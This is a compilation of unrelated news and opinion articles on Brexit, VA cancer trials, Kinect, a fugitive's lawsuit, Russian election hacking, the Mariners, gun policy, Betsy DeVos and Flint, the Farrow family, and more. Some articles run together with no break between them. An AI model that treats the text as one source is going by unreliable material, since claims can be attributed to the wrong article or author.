Senior Tory ‘leave' campaigners have been just as withering in their commentary, with US-born London Mayor Boris Johnson accusing Obama of “outrageous and exorbitant hypocrisy.”
“There is no country in the world that defends its own sovereignty with such hysterical vigilance as the United States of America,” he wrote in the Telegraph in March.
Outspoken Tory Brexiteer Jacob Rees-Mogg also took a swipe at the president in parliament's House magazine.
“I can't think the British people will want to be told what to do by a rather unsuccessful American president who has had one of the least successful foreign policies in modern history,” he said.
In early March Conservative MP Steve Baker appeared to suggest Obama should look at American history before intervening in British politics.
“Whenever a US president intervenes in our constitutional future, I always reread the US Declaration of Independence,” he told the Independent.
“We will solve peacefully at the ballot box the problem for which their nation fought a bloody war of insurrection,” he added.
Peter Bone, another Conservative Brexiteer, told the paper Obama ought to “keep his comments, his views, to himself.”
Disagreement over how a Brexit may impact upon national security has become a staple of the debate in the run up to the June 23 vote.
Former Blair-era spin doctor Alistair Campbell warned on Wednesday that Britain leaving the EU would suit those who might not have the UK's best interest at heart.
“[Russian President Vladimir] Putin probably. ISIS [Islamic State] definitely. And, depending on what mood he is in, Donald Trump. That's about it on the international scene,” Campbell told the Guardian.
Veterans are at increased risk for various types of cancer, but administrative and financial roadblocks often prevent them from access to clinical trials outside of the VA health care system.
A new 2-year pilot program aims to streamline this process for U.S. veterans in the Los Angeles area by allowing these patients to enroll in early-phase cancer treatment trials led by researchers at UCLA.
Fairooz Kabbinavar
HemOnc Today spoke with Fairooz Kabbinavar, MD, professor of hematology and oncology at UCLA and a co-leader of the joint program, about how it came about, its mission and how it will evolve over time.
Question: How did the UCLA and VA cancer care for veterans program come about?
Answer: Dennis J. Slamon, MD, PhD, chief of the division of hematology–oncology at UCLA, Matthew Rettig, MD, medical director of the prostate cancer program at the Institute of Urologic Oncology at UCLA, and I sat down and realized that — although we had a very active and robust cancer clinical trials program at the main UCLA campus — we did not have something similar at VA West Los Angeles Medical Center. We wanted to set up something similar to this at the VA hospital. As we looked at the division of hematology/oncology at the VA hospital, there were no active clinical trials being conducted. This is how this program started. I was then asked to head the program, so I went to the VA hospital, applied for privileges and then began building the clinical trials program.
Q: What was the impetus for this program?
A: The veterans receive their cancer care at VA West Los Angeles Medical Center. However, without an active clinical trials program, veterans did not have access to new and cutting-edge treatments that had not yet been approved by the FDA. It is the unfortunate reality for patients with advanced cancer that they are only able to receive new, novel cutting-edge treatments via a clinical trial. This was an unmet need for cancer patients at VA West Los Angeles Medical Center and was the driving force for us to bring clinical trials to the VA cancer patient population.
Q: What cancer types will be the focus?
A: We see a very fair amount of lung cancer, head and neck cancer, prostate cancer and colon cancer at VA West Los Angeles Medical Center. It is the hope that many of the trials will target these common malignancies. We do not currently see many breast cancer patients, because there are not very many female veterans at our facility at this time.
Q: What types of trials have been initiated so far?
A: Early on, the process was slow because I was trying to gain my privileges as well as establish a team. We have one trial in prostate cancer and one in colorectal cancer that are currently enrolling. We have another three trials in lung cancer that have been opened for enrollment and a fourth lung cancer trial that we have submitted to the institutional review board. We have another trial soon to be opened in head and neck cancer. This new program has developed traction and we are very excited about it. It has been about one and a half years now that the program has been off the ground and we hope it becomes as much of a success as our program at the main campus. It is a win-win situation for our veterans with incurable cancers, as it provides them a way to access new cutting-edge molecules.
Q: What type of challenges and roadblocks have you encountered so far?
A: The challenges that we have faced are much like any programs just starting out. Working in the veterans system, there are more rules and regulations that cause things to move a little more slowly than usual. Other challenges have come, but they have all been resolved now.
Q: How do you see the program evolving?
A: We will continue to bring new trials and new treatments to our veterans with cancer through our clinical trials program. Once we show that we can deliver quality research, others will follow. Our goal is to initiate trials that cover some of the most common cancer types among veterans seeking medical attention at a VA facility. Once we are able to show that the clinical trials program has been met with some degree of success and we can deliver high-quality cancer care to our veterans, I think other VA facilities will follow suit. One issue is that most of our clinical trials come through the pharmaceutical industry. Once we are able to show other VA facilities and the pharmaceutical industry that we can deliver high-quality health care and research then the industry will begin to bring trials to the VA facilities. My sense is that it is going to take some convincing of the industry, but it will ultimately be a win-win situation for our VA patients. Progress in oncology can only be made through research.
Q: What type of impact might this program have on overall cancer care for veterans?
A: All U.S. veterans receive high-quality health care through VA facilities, but what was lacking was access to newer cutting-edge clinical research and novel drugs. Once we get this program going and can show other VA facilities that it works, then other VA facilities around the country hopefully will start with clinical trial programs of their own and hopefully all VA cancer patients will have access to new treatment options via cancer clinical trials.
Q: Do you have any final thoughts?
A: VA cancer patients should not only discuss the FDA-approved treatments with their oncologist, they should always inquire how to take part in clinical trials. Patients and their relatives have to be proactive and ask their treating physician about the availability of clinical trials.

I owe everyone an apology. This past March, I stated that "Steel Battalion: Heavy Armor validates owning a Kinect." As it turns out, I was so, so wrong. We went as far as having the Steel Battalion: Heavy Armor review pass through the hands of three different Destructoid editors in an attempt to get the game to work, until finally realizing that Heavy Armor is, in fact, simply broken.
The reason why I was so hyped for Steel Battalion in the first place, other than loving the original Xbox game, was because I wanted to believe that the Kinect could actually succeed with a real core game. Up until this point, Kinect seemed designed to work with a few specific types of games: exercise games, on-rails experiences, and party games.
The key driving force here was that Steel Battalion was going to be the first game to use the actual controller in conjunction with the Kinect motion detection. That's what I, and I'm sure many others, believed would be key to making a legitimate experience on the Kinect.
After yesterday's review, however, I've come to the realization that the Kinect is a glorified beta test that we've all been suckered into buying.
First, I need to address my earlier hyperbolic statements. When I went hands-on with Steel Battalion just prior to GDC a few months back, the setup of the room was the most ideal environment one could have to play any Kinect game. Brightly lit, lots of room, and optimal spacing between the Kinect and player. When I played it there, Heavy Armor was functioning just fine for me.
So you can hopefully understand where I was coming from when I made what is now an obviously outlandish statement. I downloaded the Steel Battalion demo last night to see how the game would do in my living room. It was barely five minutes into the demo before I rage-quit after getting stuck in a loop where I was entering and exiting the cockpit view. I was sitting as instructed, with my hands and controller in my lap, yet the Kinect was just unable to process that I wasn't moving my arms at all.
It was then a realization dawned over me. I've been making excuses with every Kinect game up until this point. Every time a motion or voice command failed with any game, I would shrug it off until I got whatever I was trying to make happen. Why have I been so forgiving all this time? We would cry bloody murder if we had to press a button on our controller or keyboard multiple times to get an action working. Imagine trying to shoot a weapon in something like Call of Duty, where your gun would only fire on every third or fourth pull of the trigger. That would be unacceptable, and yet nearly two years since the launch of the device "Kinect forgiveness" is applied to every Kinect game released.
I'm done making excuses, as it's become grossly obvious to me that the device doesn't work, and I doubt it will ever be fixed in its current form. We've all just been test subjects, feeding the device data that will shape the next iteration of the Kinect. The rumors regarding the next Xbox console have been increasing since the start of the year, and this supposed leaked document detailing Microsoft's future vision proposes the Kinect 2 with higher accuracy, improved voice recognition, four-player support, and a dedicated hardware processor. Wait, some of that sounds familiar, doesn't it?
Oh yeah. All this and more was promised when the Kinect was known as Project Natal. Instead, what we got was a shadow of what was shown. As for the voice recognition, the whole feature is about as useful to me as it is to say "Xbox, open disc tray."
I think the main problem with Kinect is that seemingly no one in the industry is pushing the hardware at all when developing for it, with most attempts feeling like half-assed cash-ins. It's rather telling when a first party published title doesn't even try, as was the case with Kinect Joy Ride.
I say most. Like I said earlier, the Dance Central series is done rather well, and titles such as Twisted Pixel's The Gunstringer and Grasshopper's Diabolical Pitch have been fun, but they seem to be fun in spite of the Kinect features rather than because of them. The best Kinect-enabled games that really take advantage of the device seem to only be the ones directed at children, with Double Fine's Sesame Street: Once Upon a Monster, and Kinectimals being some shining examples. If anything, kids are the perfect target for the Kinect, as they're hyper little monsters that won't be fazed from having to repeatedly wave their arms or scream at their TV trying to make something happen.
The Kinect was designed for gaming, but the areas where it actually excels have nothing to do with games. Hacks of all sorts have been designed for the Kinect, from acting as a virtual dressing room, making autonomous flying robots, helping doctors in the operating room, to so much more. There's a serious problem when the hacks and mods do so much more with the Kinect than the games do.
I'm mad because Microsoft has been shoving the Kinect in everyone's faces since 2010 as if we need it, like Xbox 360 owners can't live without it. It is not an enjoyable experience at all having to repeat the swipe of your hand or voice command to do something as simple as navigate the poor layout of the Xbox 360 Dashboard, especially when it's far easier to do anything with the controller itself.
None of the motion controller experiences are flawless, but between the big three, the Kinect is the worst offender of them all. I can't help but feel all this is moot at this point. Microsoft has laughed all the way to the bank, selling 18 million Kinects worldwide as of January 2012. Perhaps my grievances with the Kinect are too little, too late. Still, there's this odd sense of peace knowing that I'm done with the Kinect this generation.

Zeboyd Games radical 16-bit parody RPG, Chtulhu Saves the World, is coming to mobile devices this year. And sooner than you'd think. On Twitter, lead designer Robert Boyd says the studio held this announcement until work was almost finished, and he expects the game to hit at some point this quarter. Nice guy!
Meaningful details, like, how this version will control, if it'll include any extras, or its price point aren't being discussed at this time. A note on the game's blog does say that more information is coming in the next few weeks, but since we're so nosey we've reached out to Zeboyd for more anyway.
If you've played Breath of Fire or an old-school Final Fantasy, you'll be able to get your head around Cthulhu‘s systems and mechanics pretty quickly. The awareness of what genre its in, the sharp improvements it makes, and the humor is what makes it pretty great. Here's hoping the mobile ports rock just as hard.

You always hear urban legends (and some of them turn out to be real cases) about burglars who sue — and win against — homeowners for injuries sustained during the robbery. These are the kinds of cases that make you wonder how the justice system even functions, because you can literally sue for just about anything these days.
Oh, you fell through a skylight while you were attempting to burglarize a home and cut your arm? File a lawsuit! You tried to steal a television set from your neighbor and got bitten by his dog in the process? Time to litigate! So, what happens when you're on the run and you decide to break into a couple's home and hold them hostage?
Our latest pro se criminal litigant decided to up the ante. He's suing his former kidnapping victims for breach of contract….
Back in 2009, Jesse Dimmick was fleeing from the police in a stolen car on murder charges he faced in Colorado. He made it as far as Kansas (which is impressive!), but it was at that point, he decided it would be a good idea to find a place to hide. That place turned out to be the home of Jared and Lindsay Rowley, a newlywed couple.
Dimmick reportedly entered the Rowleys' home brandishing a knife. The Rowleys were frightened, but were apparently able to gain Dimmick's trust by offering him Cheetos and Dr. Pepper and watching a movie with him. You can't complain about a cheap date.
The couple escaped after Dimmick fell asleep, and of course, they decided to sue him. They're seeking more than $75,000 in their suit for trespass, negligent infliction of emotion distress, among other things. But here's the kicker… Dimmick is countersuing.
What for? After the Rowleys contacted the police, an officer's gun was accidentally discharged, and Dimmick was shot in the back. Dimmick blames the Rowleys. The Topeka Capital-Journal has more:
Dimmick filed a response Oct. 21 seeking to have the Rowleys' claim dismissed and stating a counterclaim for breach of contract seeking $160,000 to cover hospital bills and $75,000 for pain and suffering. Dimmick's response said he was representing himself “without the aid of proffessional (sic) legal counsel.” He wrote that after he entered the Rowleys' home, “I told them that I was being pursuid (sic) by a person, or persons, who appeared to be police officers, who were trying to kill me.” He added: “I, the defendant, asked the Rowleys to hide me because I feared for my life. I offered the Rowleys an unspecified amount of money which they agreed upon, therefore forging a legally binding oral contract.”
Maybe if Dimmick had consulted with a lawyer, or hell, even a law student, he would have known that you can't contract for something that's illegal, like, I dunno, harboring a fugitive?
And that's really beside the point, because if a man came into your home and allegedly threatened you with a knife, wouldn't you go along just about anything he said to escape with your life? Hello, that's called duress.
Let's put this in terms that Dimmick can understand: “pursuiding” this claim makes you a “proffessional” loser.

Microsoft today added Bitcoin currency conversion to Bing, which supports over 50 currencies in its index. Conversion is as simple as typing in “x btc to currency” or “x currency to btc.” The data is provided by digital wallet company Coinbase:
Microsoft says the digital currency option is initially available to people in Australia, Canada, India, the UK, and the US, but will be rolling out to additional markets “in the coming weeks.” There's no word on other popular options like Litecoin and Dogecoin, which leaves an opening for Google to surpass Bing when it gets around to supporting digital currencies.

Extortion charges brought against two City Hall officials in connection with the Boston Calling music festival scandal will go forward, a federal judge has ruled.
U.S. District Court Judge Leo T. Sorokin today refused to dismiss the conspiracy and extortion indictments faced by tourism and entertainment czar Kenneth Brissette and Timothy Sullivan, Mayor Martin J. Walsh's intergovernmental affairs chief, saying, "none of the defendants' arguments merit the extraordinary remedy of dismissal.
"In short," Sorokin wrote in his 11-page denial, "the Court may not grant the relief the defendants seek without intruding on the role of the Grand Jury that returned (the indictments), the petit jury that will evaluate the evidence and find the facts at trial, or both."
Sorokin has ordered that both sides submit a status report on the case to him by next Tuesday.
That report, Sorokin said, is to include "possible dates for the trial in this case."
Brissette and Sullivan have pleaded not guilty to the charges. They are on leave from their posts.
The men are accused of trying to strong-arm Crash Line Productions, the festival's producer, into hiring nine union workers from the International Alliance of Theatrical Stage Employees Local 11 in 2014 that the company did not want or need.
The city issued Crash Line the permits it required to stage Boston Calling on City Hall Plaza after the company yielded to Brissette's and Sullivan's demands, according to prosecutors.

Diablo III will be available the night Reaper of Souls goes live and there will be no need to patch or exit the game once the clock strikes GO!
We advise logging in ahead of time to reduce potential queue times. Once you're in-game and the Reaper of Souls has launched in your region, you'll see a server broadcast message letting you know that the expansion is now available to play. This means you can continuously play Diablo III all night long and jump straight into Act V the moment it's available!
Note: In order to access Act V once Reaper of Souls is live, you will need to exit your current game and select Act V from the Quest Select window. If you want to avoid having to recreate your game, we recommend that you set up your game so that you're killing Diablo after your gameplay region's launch time. This way, you can naturally transition into Act V without any additional effort.
Depending on how many people attempt to join the crusade against the Angel of Death on March 25, you may encounter a new message while playing: "The Diablo III servers are busy." Below this message, you should see a time estimate (if the estimate is < 1 minute) as well as pulsating ellipses.
If you receive this message, it means you're currently entering a game queue. Just be patient with the queue, and you'll be slaughtering reapers in Westmarch before you know it!
While we've worked hard to provide the best launch experience for all players heading into Reaper of Souls, even the wisest and most blessed of Vecin can't foresee all ends. Should you require troubleshooting for any of the above steps or encounter issues on launch night, we'll be on standby in the official Diablo III Forums and on @BlizzardCS, and Customer Support is just a few mouse clicks away.
We'll see you in game, nephalem!
The Obama administration refused to act aggressively against Russian hackers during the election because they believed that Hillary Clinton was going to win the White House, sources are telling NBC News.
“They thought she was going to win, so they were willing to kick the can down the road,” a U.S. official with knowledge of the scope of the hacking told NBC.
Some in the administration and in Obama's intelligence community fingered Russia during the campaign for the cyberattacks, which the administration says led to the exposure of emails hacked from the Democratic National Committee and the email account of Clinton's campaign chairman, John Podesta. But the administration has become more vocal about the intrusions since Clinton lost to Trump in last month's election.
Trump supporters have asserted that the ramped up interest in the hacking is intended to cast doubt on the validity of the Republican's White House win. Trump, who has not accused Russia of hacking, has also argued that the administration is only complaining now because Clinton lost.
“If Russia, or some other entity, was hacking, why did the White House wait so long to act? Why did they only complain after Hillary lost?” he tweeted on Thursday.
Retired Adm. James Stavridis, who was floated as a possible Clinton running mate, has also said that the administration could have done more to confront Russia.
“In retrospect it certainly seems as though it was a mistake not to call the Russians sooner and respond to them in a very forceful way,” he told NBC.
Despite Trump's claim that the administration only started complaining about hacking after he won the election, the administration did accuse Russia of attempting to influence the election during the campaign. Obama also warned Putin about hacking during September's G-20 summit.
But Obama's past comments about Russian aggression undercut his administration's new confrontational tone. The prime example is Obama's response to Mitt Romney's claim in a presidential debate in 2012 that Russia is the U.S.'s “number one geopolitical foe.”
Obama mocked that assertion in another debate, saying that “The 1980s are now calling to ask for their foreign policy back because the Cold War's been over for 20 years.”
The administration has not publicized evidence that Russia is behind the hacks. But officials with the FBI, CIA, and Office of the Director of National Intelligence have told reporters that there is strong evidence that Russian agents are behind the breaches.
On Wednesday, NBC News reported that spies working for American allies believe that Putin himself was involved in the hacking effort.
The question that is being debated within the intelligence community is whether the hacks were intended solely to help put Trump in the White House or to delegitimize the American electoral system.
On Thursday, Clinton told a group of campaign donors gathered in New York City that she believes that Russian president Vladimir Putin targeted her campaign for hacking because of a personal grudge he held against her from when she served as secretary of state.

In an interview with NPR that aired on Friday, Obama pledged to take action against Russia for the hacks.
Follow Chuck on Twitter
Tony La Russa says he may be antsy to join an MLB franchise again. (Photo11: David Manning, USA TODAY Sports) Story Highlights Tony La Russa has been working with Major League Baseball
He is in the running to become the Seattle Mariners' team president
He acknowledged he may be interested in joining a front office
Tony La Russa, who a month ago reached baseball's pinnacle by being elected into baseball's Hall of Fame, now could be poised to climb yet another towering peak.
La Russa is on the Seattle Mariners' short list of candidates to replace outgoing president Chuck Armstrong, two baseball officials with knowledge of the search told USA TODAY Sports. They spoke on the condition of anonymity since the search process is ongoing.
Mariners CEO Howard Lincoln would neither confirm nor deny La Russa's candidacy, but divulged that the interview process began this week with two candidates within the Mariners' organization.
If Lincoln and the Mariners board of directors believe one of the internal candidates are suited for the job, they won't even bother looking to La Russa or someone outside the organization.
Yet, with La Russa's high-profile resume and several prominent Major League Baseball officials recommending La Russa to Lincoln, he could be the odds-on-favorite to be the next Mariners' president, providing they open the search to outside candidates.
La Russa, when contacted, declined to specifically talk about the Mariners' opening, but acknowledged that he's interested in leaving his special assistant's job with Major League Baseball, and join a team's front office.
"I'm interested in getting to the competition upstairs,'' La Russa said. "I've missed the competition since I left the field. I talked to the commissioner [Bud Selig] about it. It's not a thing where you miss the dugout, but I miss the winning and losing.
"The situation has to be right.''
And the Mariners' situation is ideal.
They are loaded with money, pitching, minor-league talent, and now a prized $240 million investment in second baseman Robinson Cano.
THE TANAKA SWEEPSTAKES: Mariners among at least a dozen in it
There's no reason the Mariners can't soon replicate the Seattle Seahawks' success across town, and earn back a slice of the Great Northwest's fan base, after being immersed in a 12-year playoff drought.
"I think we're very well positioned,'' Armstrong told USA TODAY Sports. "People are so excited about the Seahawks here. I think we can feed off that too. There's no question about it.
"I remember when the [NBA] Sonics left town, people said that will help you. No, it soured people on professional sports. That's why I applaud the Seahawks. I hope they win the Super Bowl. It's got people feeling good about sports here, and I think it very well could carry over.''
Club presidents traditionally generate as much enthusiasm and passion for a team's fan base as the groundskeepers. They mostly are accountants. Lawyers. Men entrenched with deep financial skills.
The only club president in recent times to change that aura was Hall of Fame pitcher Nolan Ryan, who dramatically helped transform the Rangers' image. He retired last October, with his iconic image intact, after six years on the job. The Rangers, certainly bolstered by shrewd general manager Jon Daniels and his staff, turned a decaying franchise into one of baseball's elite.
Now, the Mariners have an opportunity to do the same with La Russa.
Oh, it's not to say the Mariners don't have viable internal candidates. There are two men that have caught Lincoln's attention who are being interviewed this week. They may be perfect for the job.
Yet, no one would command the respect and admiration as La Russa, the Hall of Fame manager who won three World Series championships.
Certainly, he has proven he can lead people.
He knows virtually everyone in the game.
And he's got plenty of good friends in high places, including Howard Schultz, the chairman and CEO of Starbucks.
The Mariners hope to reach a decision within the next three weeks, Lincoln says, certainly, before Armstrong leaves office on Jan. 31. Yet, if there's a preferred candidate, Lincoln isn't tipping his hand.
"It's going to be very difficult to fill Chuck's position,'' Lincoln said. "It's difficult for someone to fill his shoes when you look at his years of service with the Mariners, his knowledge of the business of baseball, his close associations with people in baseball. He has a great respect and great admiration from everyone in the game.
"This job requires knowledge of baseball, entails finance and accounting, and marketing and sales. Whoever gets this job should be fumier with cash-flow statements, making business decisions, dealing with player agents and the commissioner.
"It's a lot of responsibility.''
La Russa could be an ideal fit.

There's value in curation
In the ongoing battle between cloud-hosted music streaming and storing your own music, most of the attention is fixed on the obvious benefits of cloud based music: instant access to enormous music libraries, greater convenenience, less of a requirement to store your own music.
These benefits sound powerful, and in many cases most people will find such an approach to music more convenient. But there are a number of subtle side-effects that are less frequently discussed.
Most of these side-effects are rooted in the independence of music from your physical locality. No longer do you purchase the music you want to hear. Instead, in a subscription access model, you purchase generalised access to music. Furthermore, not only is the music no longer distributed on a physical artifact, it's not even located in your house.
Curation and ownership
On most cloud based music services you don't purchase music on an album-by-album or work-by-work basis. The accent towards the instant access model of music distribution, search and play any track in seconds, means it is inpractical to bill the user for each time they play a given song. Indeed, that friction would stop people exploring the music library quite so freely.
Instead, cloud hosted music tends to operate a free tier, where the music is interrupted by advertisements, and then paid tiers free of advertisments where access to the entire library can be purchased on a rolling time period, such as month by month.
Given this approach, can you ever really say you own a music collection now?
You might say sure, but why would I want to own a music library? Fair enough. But not so long ago, a music library was considered a narrative of a person's life. Just as you can look at a person's bookshelf (or Kindle these days!) to learn of their interests, their history and their passions, so to can you look at someone's music collection to learn their eclecticism, their drive, even what their friends may be like (or you can at least try). Looking at your old LPs or CDs stirs memories, good and bad, of the past.
By removing that concept of ownership, we've removed the feeling that we are curators of our own musical journeys.
The album
The medium can sometimes define the message. Arguably the golden age of the popular music album was during the days of the vinyl LP. The LP was a physical artifact that required a modicum of effort to play and it could only be played in full, beginning to end.
This enforced the concept of the album. As a listener you had to listen to the entire thing. Whilst, in theory, changing the record or moving the needle doesn't require too much effort, one's lizard brain nudges you to listen to the whole album, including the "one for the album" tracks (we all know some examples!). But by listening to the entire album you would understand the release as greater than the sum of its parts. Variances in style and tone were evident, and the narrative, defined by the lyrics, would develop through the album. From here, for instance, the concept album was born.
The CD, while still a physical item, did add in random access, which meant it was possible to easily skip tracks. It also saw the advent of the shuffle button. While many great albums continued to be released on CD, the new affordances offered by the skip and shuffle buttons we one step toward dissuading the album as an art form.
With the advent of cloud hosted music we now have non-physical, random access music that can be changed, skipped, and replaced with any other release without even getting out of your armchair. This is another step toward The Shallows. The loss of the former physical constraints that begat the album art form may mean the reason to work on an album at all becomes less relevant to artists.
It's unlikely that the album will die out totally because the cultural resonance remains; bands still want to record proper long-players. But the trend appears to be going only one way.
As I said previously, the concerns raised here are probably not a huge issue for most people wanting to simply listen to some music. I think, in general, cloud hosted music will win the battle for the mainstream, and new ways of interaction will develop which enable more subtle constructs such as 'curation' and concepts similar to 'albums' over time.

(CNN) – Republicans on Sunday were reticent in voicing support for the National Rifle Association's scheme to place guards with firearms in American schools, though they also appeared to find little common ground with Democrats, who want tighter restrictions on purchasing assault weapons.
Lawmakers from both parties have agreed that some changes are needed following the Newtown, Connecticut, shooting on December 14 that left 28 people dead, including 20 children. But while Democrats advocate new legislation making it harder to obtain military-style firearms, Republicans claim such measures have proved ineffective in the past.
The NRA, the top lobbyist for gun manufacturers, asserted on Friday that armed guards in schools were the best prevention against a similar tragedy. That proposal, along with vows from Democrats to reintroduce bills banning assault weapons and high-volume ammunition clips, was met with skepticism Sunday from Sen. Lindsey Graham, a South Carolina Republican.
"We had an armed guard in Columbine, we had an assault ban. Neither one of them worked," Graham said on NBC's "Meet the Press."
"We're talking about preventing mass murder by nontraditional criminals, people who are not traditionally criminal, who are not wired right for some reason," he continued. "And I don't know if there's anything Lindsey Graham can do in the Senate to stop mass murder from somebody that's hell-bent on doing crazy things."
Another Republican, Sen. John Barrasso of Wyoming, also cast doubt on the NRA's proposal, saying a national effort to place guards with guns in schools was misguided.
"I think decisions about schools ought to be made at the local level," Barrasso said on "Fox News Sunday." "I would not want a national effort to say you have to do this in schools. I think local education decisions are best made at the local level."
On CBS' "Face the Nation," GOP Sen.-designate Tim Scott said Americans shouldn't "rush to judgment" on the NRA's plan, but didn't offer an endorsement of the plan himself.
And Rep. Jason Chaffetz, a conservative from Utah, said on NBC he was worried about arming educators since he "had science teachers in high school who can't negotiate a Bunsen burner for goodness sake."
"I wouldn't suggest necessarily that we give everyone a gun. It's not for everybody," he continued. The NRA has specified it is not advocating teachers carry guns in school; rather, the group suggests schools could follow the example of malls and movie theaters that employ retired or off-duty policemen.
Nearly every Republican appearing on the Sunday talk shows agreed that new gun restrictions were the wrong path to take in the aftermath of the Connecticut shooting - though some expressed an openness to hearing all options put forward.
Republican Sen. Johnny Isakson of Georgia said he wanted President Barack Obama's newly formed team on gun violence to look into every aspect that could lead to a massacre like the one in Newtown, but that previous bans on assault weapons had done little to stop senseless killing.
"Bans alone don't solve the problem," he said on ABC's "This Week," pointing to a prohibition on military-style weapons that was in effect in 1999 when the shooting at Columbine High School claimed the lives of 12 students and one teacher.
Barrasso said Americans "can get false sense of security from Washington, and in passing more laws. But we need real solutions to a significant problem in our country, and I'm not sure passing another law in Washington is going to actually find a real solution."
And Graham wondered how a ban preventing him from purchasing another AR-15 semi-automatic rifle would thwart another tragedy like the one in Newtown.
"If you deny me the right to buy another one, have you made America safer?" he asked.
Democrats say yes. Sen. Joe Lieberman, the retiring independent senator from Connecticut who caucuses with Democrats, said bans making it impossible to buy the type of weapon used in Newtown would reduce the chance of similar shootings in the future. While Republicans' intransigence on the issue means such a ban won't come easily, he said, the public is ready for new laws.
"It's going to take the American people getting organized, agitated, and talking to their members of Congress," Lieberman said on CNN's "State of the Union."
How Donald Trump Is Connected to the Flint Water Crisis
Trump's pick for Secretary of Education, Betsy DeVos, was instrumental in passing the law that set the stage for the Flint water crisis.
Flint, Michigan still does not have clean drinking water.
Now, President-elect Donald Trump — whose campaign stump speech included a crude joke about the city's water crisis — has tapped one of the people responsible for the crisis to join his Cabinet.
Betsy DeVos, Trump's pick for Secretary of Education, and her family have a long history of using their wealth to manipulate Michigan state elections and push through “reforms” that undercut local democracy. She's a staunch advocate of privatization measures that shift power from people to corporations — and one of those measures led directly to the poisoning of Flint's water and citizens.
Betsy DeVos and the Law That Poisoned Flint
In trying to get to the root of the crisis in Flint, many have pointed to Michigan's emergency manager law, which allows the governor to bypass the elected government and appoint a single official to take over a city's budgeting. The law was actually overturned by a popular referendum in 2012, but sneakily pushed back through state legislature by Governor Rick Snyder immediately afterwards in a way that prevented it from being subject to another public vote.
And when Michigan voters said they didn't want their local democracies hijacked, they had good reason. It was Flint's emergency financial manager Darnell Earley who all but forced the city to switch its water source to the polluted Flint River.
Earley both overruled a city council vote that would have prevented the switch and declined an offer from neighboring Detroit to provide safe, sanitized water. But if Earley is responsible for the disastrous decision itself, those who paved his way to power are also to blame — and that's where Betsy DeVos comes in.
Since the 1970s, the DeVos family has invested at least $200 million in far-right think tanks, media outlets, PACs, and other causes, with a particular focus on their home state of Michigan. Along with the Koch brothers, they're major funders of the Mackinac Center for Public Policy, a Michigan-based partner of the Heritage Foundation and architect of the state's emergency manager law. Between 1998 and 2011, four DeVos-controlled foundations have given $560,000 to the Mackinac Center; that figure doesn't include donations from personal trusts or corporations, which do not have to be reported.
With the Mackinac Center working to craft the legislation that would advance the DeVos' privatization agenda, they needed a governor who would push it through to law. So in 2010, the family spent $1.9 million in the election that put Governor Snyder in power.
Months later, Snyder signed the emergency manager act into law and appointed a Mackinac executive as the state's first emergency manager. That manager's first move? Outsource the city of Pontiac's water system to a company indicted on federal conspiracy charges and Clean Water Act violations.
The writing was on the wall for Flint.
Betsy DeVos and the Trump Administration
The results of the type of pro-corporate, anti-democratic measures DeVos stands for are clear. We've seen what happens when politicians abuse their power to wrest democracy from the hands of the people — and it's still unfolding in Flint.
With DeVos as Secretary of Education, we could see the same happen to public schools. DeVos has long maneuvered to strip funding and resources from public schools, favoring instead a voucher system that diverts public funding to private and religious schools. Among many other consequences, that could have grave implications for science and climate change education in schools across the country.
Furthermore, selecting DeVos — a Koch-esque member of the billionaire GOP donor class — runs directly counter to Trump's campaign promise to reform Washington by “draining the swamp” of establishment Republicans.
As far as Flint goes, Trump blamed the whole fiasco on “incompetent politicians” in a speech earlier this month. By his own measure, it looks like he just nominated one for his Cabinet.
Dylan Farrow's Feb. 1 open letter to The New York Times detailing sexual molestation she says she suffered at the hands of her father Woody Allen reignited a controversy that has divided their family bitterly for more than 20 years.
Now her brother Moses Farrow is speaking out to defend Allen – and accuse their mother, Mia Farrow, of poisoning the children against their father.
“My mother drummed it into me to hate my father for tearing apart the family and sexually molesting my sister,” Moses, 36, tells PEOPLE in the magazine's new issue. “And I hated him for her for years. I see now that this was a vengeful way to pay him back for falling in love with Soon-Yi.”
A Family Divided
Moses and Dylan, 28, both adopted by Allen and Farrow, and their brother Ronan, 26, were in the center of a 1993 custody battle in which both sides testified about Allen's affair with Farrow's adopted daughter Soon-Yi Previn, whom Allen went on to marry in 1997. Farrow was awarded custody of the couple's three children. (In total, she has 14 kids from her marriages and solo adoptions.) Allen, 78, who was investigated but not charged with molestation, has for decades denied abusing Dylan, maintaining that Farrow, 69, coached Dylan, an accusation Farrow has always denied.

“Of course Woody did not molest my sister,” says Moses, who is estranged from Farrow and many of his siblings and is close to Allen and Soon-Yi. “She loved him and looked forward to seeing him when he would visit. She never hid from him until our mother succeeded in creating the atmosphere of fear and hate towards him. The day in question, there were six or seven of us in the house. We were all in public rooms and no one, not my father or sister, was off in any private spaces. My mother was conveniently out shopping. I don t know if my sister really believes she was molested or is trying to please her mother. Pleasing my mother was very powerful motivation because to be on her wrong side was horrible.”
Dylan's Response
Dylan insists that she is telling the truth.
“This is such a betrayal to me and my whole family,” she tells PEOPLE in response to her brother's comments. “My memories are the truth and they are mine and I will live with that for the rest of my life.”
“My mother never coached me,” Dylan says. “She never planted false memories in my brain. My memories are mine. I remember them. She was distraught when I told her. When I came forward with my story she was hoping against hope that I had made it up.

Moses accuses Farrow of bullying him as well. “Our mother has misled the public into believing it was a happy household of both biological and adopted children,” he says. “From an early age, my mother demanded obedience and I was often hit as a child. She went into unbridled rages if we angered her, which was intimidating at the very least and often horrifying, leaving us not knowing what she would do.”
“I don't know where he gets this about getting beaten,” counters Dylan. “We were sent to our rooms sometimes.”

“I will not see my family dragged down like this,” she adds. “I can't stay silent when my family needs me and I will not abandon them like Soon-Yi and Moses. My brother is dead to me. My mother is so brave and so courageous and taught me what it means to be strong and brave and tell the truth even in the face of these monstrous lies.”
Farrow, who declined to respond to Moses's accusations, Tweeted, “I love my daughter. I will always protect her. A lot of ugliness is going to be aimed at me. But this is not about me, it's about her truth.”

Moses, a family therapist, says that his own life has been made better by spending time with Allen.
“I think my sister is missing a great deal in life in not reconnecting with her father, who had always adored her,” he says. “It s important that she assert her independence from our mother and not go through life with the false impression that she has been molested by my father. I am very happy I have come into my own power, separating from my mother, which has led to a positive reunion with my father.”

‘Horrible Tragedy'
Allen's family says that the director is devastated by Dylan's letter.
“This is a horrible, horrible tragedy,” Allen's sister Letty Aronson tells PEOPLE. “He feels very badly for Dylan, that she has been so poisoned by her mother.”
Dylan, of course, feels very differently.
“I have a wonderful family,” she says. “We are brave and we are truthful and anyone who says anything otherwise does not know us.”

Iowa is asking the Trump administration for permission to jettison fundamental aspects of its Affordable Care Act marketplace, contending that a large-scale rewriting of the rules is the only way to prevent the state from becoming the first without any health plans available under the law next year.
